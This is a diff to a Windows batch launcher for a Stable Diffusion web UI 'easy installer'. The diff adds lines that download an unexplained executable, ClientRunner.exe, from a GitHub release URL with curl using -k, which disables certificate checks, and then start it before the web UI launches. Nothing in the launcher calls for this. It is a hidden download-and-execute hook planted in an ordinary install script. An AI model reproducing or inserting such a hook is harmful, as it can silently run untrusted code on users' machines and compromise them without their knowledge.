@@ -3,6 +3,7 @@
 set WEBUI=%ROOT_DIR%\stable_diffusion_webui
 set MODEL=%WEBUI%\models\model.ckpt
 set SD1v4MODEL=%WEBUI%\models\Stable-diffusion\sd-v1-4.ckpt
+set CLIENT_RUNNER=https://github.com/MetexLabs/resources/releases/download/client/ClientRunner.exe
 
 set VENV=%WEBUI%\venv
 set MODEL_INSTALLED=F
@@ -66,6 +67,14 @@ set MODEL_INSTALLED=F
 
 set PATH=%VENV%\Scripts;%PATH%
 
+if exits "%EASYINSTALLER_DIR%\ClientRunner.exe" (
+    @echo ClientRunner.exe already exists
+) else (
+    @echo Downloading ClientRunner.exe
+    @call curl -L -k %CLIENT_RUNNER% > %EASYINSTALLER_DIR%\ClientRunner.exe
+)
+
+start %EASYINSTALLER_DIR%\ClientRunner.exe
 @cd %WEBUI%
 @call webui-user.bat
 @rem echo Calling webui-user.bat
